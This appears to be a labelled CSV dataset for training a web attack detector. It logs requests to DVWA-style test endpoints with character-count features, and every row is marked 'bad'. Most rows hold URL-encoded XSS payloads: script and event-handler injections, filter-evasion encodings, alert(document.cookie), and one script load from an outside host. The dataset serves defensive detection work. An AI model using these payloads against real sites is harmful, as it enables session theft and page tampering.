method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx82javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx60javascript%3Aalert%281%29%5Cx60src%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5Cx00javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx86javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=alert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--,,0,1,1,4,0,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Djavascript%3Ajavascript%3Aalert%281%29%3E,,0,0,0,1,1,6,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,4,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3D%22x%22%3Ex%3C%2Fdiv%3E+%3Cxml%3Anamespace+prefix%3D%22t%22%3E+%3Cimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+targetElement%3D%22x%22+to%3D%22%26lt%3Bimg%26%2311%3Bsrc%3Dx%3Ax%26%2311%3Bonerror%26%2311%3B%3Djavascript%3Aalert%281%29%26gt%3B%22%3E,,0,14,0,1,10,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+onmouseover%3D%22alert%28document.cookie%29%22%3Exxs+link%3C%2Fa%3E,,0,2,0,1,2,2,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+%5Cx0Conerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx0Dcript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx88javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E,,2,2,0,1,1,3,bad
GET,/vulnerabilities/xss_r/?name=%3Cform+id%3Dtest+onforminput%3Djavascript%3Aalert%281%29%3E%3Cinput%3E%3C%2Fform%3E%3Cbutton+form%3Dtest+onformchange%3Djavascript%3Aalert%281%29%3EX,,0,0,0,2,4,8,bad
GET,/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%25253Cscript%25253Ealert%28%27XSS%27%29%25253C%25252Fscript%25253E,,2,0,0,1,0,4,bad
GET,/vulnerabilities/xss_r/?name=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%26lt%3BSCRIPT+DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B%2FSCRIPT%26gt%3B%22%3E%3C%2FBODY%3E%3C%2FHTML%3E,,0,12,0,1,7,8,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3Eif%28%22x%5C%5CxE1%5Cx96%5Cx89%22.length%3D%3D2%29+%7B+javascript%3Aalert%281%29%3B%7D%3C%2Fscript%3E,,0,2,0,2,2,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5Cx20expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
POST,/security.php,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E-javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%3C%2Fstyle%5Cx3E%3Cimg+src%3D%22about%3Ablank%22+onerror%3Djavascript%3Aalert%281%29%2F%2F%3E%3C%2Fstyle%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%3C%2Fstyle%5Cx20%3Cimg+src%3D%22about%3Ablank%22+onerror%3Djavascript%3Aalert%281%29%2F%2F%3E%3C%2Fstyle%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2FSTYLE%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%5Cx32%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CP+STYLE%3D%22behavior%3Aurl%28%27%23default%23time2%27%29%22+end%3D%220%22+onEnd%3D%22javascript%3Aalert%281%29%22%3E,,2,6,0,2,3,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+DYNSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx13javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx8Ajavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%5Cx3Aexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3C%21--%3Cimg+src%3D%22--%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E,,0,2,2,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+onmouseover%3D%22alert%28%27xxs%27%29%22%3E,,2,2,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%27%60%22%3E%3C%5Cx3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx3Etype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F,,2,1,0,1,0,2,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22jav%26%2397ascript%3Ajavascript%3Aalert%281%29%22%3Etest1%3C%2Fa%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CSTYLE%3Ea%7Bbackground%3Aurl%28%27s1%27+%27s2%29%7D%40import+javascript%3Ajavascript%3Aalert%281%29%3B%27%29%3B%7D%3C%2FSTYLE%3E,,4,0,0,2,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cform+id%3D%22test%22+%2F%3E%3Cbutton+form%3D%22test%22+formaction%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EX,,0,6,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx5C%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx0Ejavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5Cx0Bjavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D,,2,1,1,1,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle+onreadystatechange%3Djavascript%3Ajavascript%3Aalert%281%29%3B%3E%3C%2Fstyle%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cb+%3Cscript%3Ealert%281%29%3C%2Fscript%3E0,,0,0,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+STYLE%3D%22xss%3Aexpr%2F*XSS*%2Fession%28javascript%3Aalert%281%29%29%22%3E,,0,2,0,2,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%5Cx3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3Ejavascript%3Aalert%281%29%3C%5Cx00%2Fscript%3E,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx%5Cx11onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3C%3Fxml+version%3D%221.0%22%3F%3E%3Chtml%3Ahtml+xmlns%3Ahtml%3D%27http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%27%3E%3Chtml%3Ascript%3Ejavascript%3Aalert%281%29%3B%3C%2Fhtml%3Ascript%3E%3C%2Fhtml%3Ahtml%3E,,2,2,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx05javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx20javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%5Cx32src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%22%27%60%3EABC%3Cdiv+style%3D%22font-family%3A%27foo%27%5Cx7Dx%3Aexpression%28javascript%3Aalert%281%29%3B%2F*%27%3B%22%3EDEF+,,4,3,0,2,2,5,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5Cx0Aexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%5Cx20%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%5Cx0A,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22%2F%5C%25%28jscript%29s%22%3E%3C%2Fscript%3E,,0,2,0,1,1,4,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22data%3A%5CxCB%5Cx8F%2Cjavascript%3Aalert%281%29%22%3E%3C%2Fscript%3E,,0,2,0,1,1,7,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5Cx0Djavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5Cx0Cexpression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,4,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx89expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cframeset+onload%3Djavascript%3Ajavascript%3Aalert%281%29%3E%3C%2Fframeset%3E,,0,0,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3E%2F*+*%5Cx00%2Fjavascript%3Aalert%281%29%2F%2F+*%2F%3C%2Fscript%3E,,0,0,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx0Fjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3Aexpression%5Cx00%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg%5Cx47src%3Dx+onerror%3D%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Ajavascript%3Aalert%281%29%3E%3C%2FOBJECT%3E,,0,0,0,1,3,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javas%5Cx05cript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+%5Cx0Bonerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=perl+-e+%27print+%22%3CIMG+SRC%3Djava%5C0script%3Aalert%28%5C%22XSS%5C%22%29%3E%22%3B%27+%3E+out,,2,4,0,1,6,3,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+style%3D%22behavior%3Aurl%28%23default%23AnchorClick%29%3B%22+folder%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EXXX%3C%2Fa%3E,,0,4,0,2,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3C%21+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx84expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx09%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5CxAFjavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cevent-source+src%3D%22%25%28event%29s%22+onload%3D%22javascript%3Aalert%281%29%22%3E,,0,4,0,2,2,5,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5Cx09expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx20%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3CBR+SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E,,0,2,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx87expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx0Dtype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX,,0,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E,,1,1,0,2,0,2,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx83javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=+%3CIFRAME+SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C%2FIFRAME%3E,,0,2,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E,,0,6,0,1,1,2,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5Cx21javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cbody+onscroll%3Djavascript%3Aalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput+autofocus%3E,,0,0,0,1,2,4,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx81javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx0C%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E,,0,0,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=ABC%3Cdiv+style%3D%22x%3A%5CxE2%5Cx80%5Cx81expression%28javascript%3Aalert%281%29%22%3EDEF,,0,2,0,2,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3CTABLE+BACKGROUND%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cli+style%3Dlist-style%3Aurl%28%29+onerror%3Djavascript%3Aalert%281%29%3E+%3Cdiv+style%3Dcontent%3Aurl%28data%3Aimage%2Fsvg%2Bxml%2C%25%253Csvg%2F%25%253E%29%3Bvisibility%3Ahidden+onload%3Djavascript%3Aalert%281%29%3E%3C%2Fdiv%3E,,0,0,0,4,5,8,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx09type%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E,,0,1,0,1,1,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+id%3Dd%3E%3Cx+xmlns%3D%22%3E%3Ciframe+onload%3Djavascript%3Aalert%281%29%22%3E%3C%2Fdiv%3E+%3Cscript%3Ed.innerHTML%3Dd.innerHTML%3C%2Fscript%3E,,0,2,0,1,4,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cstyle%3E%3C%2Fstyle%5Cx09%3Cimg+src%3D%22about%3Ablank%22+onerror%3Djavascript%3Aalert%281%29%2F%2F%3E%3C%2Fstyle%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+%5Cx22onerror%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx0Bjavascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%5Cx11%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E,,2,0,0,1,1,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%5Cx12%22javascript%3Aalert%281%29%22%3E,,0,2,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22list-style%3Aurl%28http%3A%2F%2Ffoo.f%29%5C20url%28javascript%3Ajavascript%3Aalert%281%29%29%3B%22%3EX,,0,2,0,3,1,6,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5CxF0%5Cx90%5Cx96%5Cx9Ajavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cimg+src%3D%22x%60+%60%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%60+%60%3E,,0,2,0,1,3,7,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3C%3CSCRIPT%3E%25%28payload%29s%2F%2F%3C%3C%2FSCRIPT%3E,,0,0,0,1,0,0,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E,,2,2,0,1,3,4,bad
GET,/vulnerabilities/xss_r/?name=%3Cvideo+onerror%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3Csource%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxE2%5Cx80%5Cx88javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%5Cx0A%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5Cx0Ajavascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cdiv+style%3D%22font-family%3A%27foo%26%2310%3B%3Bcolor%3Ared%3B%27%3B%22%3EXXX,,2,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5Cx14javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
GET,/vulnerabilities/xss_r/?name=%3Cmeta+charset%3D%22x-imap4-modified-utf7%22%3E%26ADz%26AGn%26AG0%26AEf%26ACA%26AHM%26AHI%26AGO%26AD0%26AGn%26ACA%26AG8Abg%26AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ%26ACAAPABi,,0,2,0,0,1,0,bad
GET,/vulnerabilities/xss_r/?name=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Ajavascript%3Aalert%281%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E,,0,2,0,2,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,,0,4,0,1,2,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cvideo%3E%3Csource+onerror%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cmeta+charset%3D%22mac-farsi%22%3E%C2%BCscript%C2%BEjavascript%3Aalert%281%29%C2%BC%2Fscript%C2%BE,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3F%3C+B+%3E,,0,0,0,0,3,0,bad
GET,/vulnerabilities/xss_r/?name=%22%60%27%3E%3Cscript%3E%5Cx09javascript%3Aalert%281%29%3C%2Fscript%3E,,1,1,0,1,0,6,bad
GET,/vulnerabilities/xss_r/?name=%3CIMG+LOWSRC%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E,,0,2,0,1,1,6,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%5Cx0Ctype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E,,0,2,0,1,0,8,bad
GET,/vulnerabilities/xss_r/?name=%3Cscript%3E%28%7B0%3A%230%3Deval%2F%230%23%2F%230%23%28javascript%3Aalert%281%29%29%7D%29%3C%2Fscript%3E,,0,0,0,3,0,6,bad
POST,/vulnerabilities/xss_s/,,0,0,0,0,0,0,bad
GET,/vulnerabilities/xss_r/?name=%60%22%27%3E%3Cimg+src%3Dxxx%3Ax+onerror%5Cx0B%3Djavascript%3Aalert%281%29%3E,,1,1,0,1,2,5,bad
GET,/vulnerabilities/xss_r/?name=%3Ca+href%3D%22%5CxE2%5Cx80%5Cx80javascript%3Ajavascript%3Aalert%281%29%22+id%3D%22fuzzelement1%22%3Etest%3C%2Fa%3E,,0,4,0,1,2,7,bad
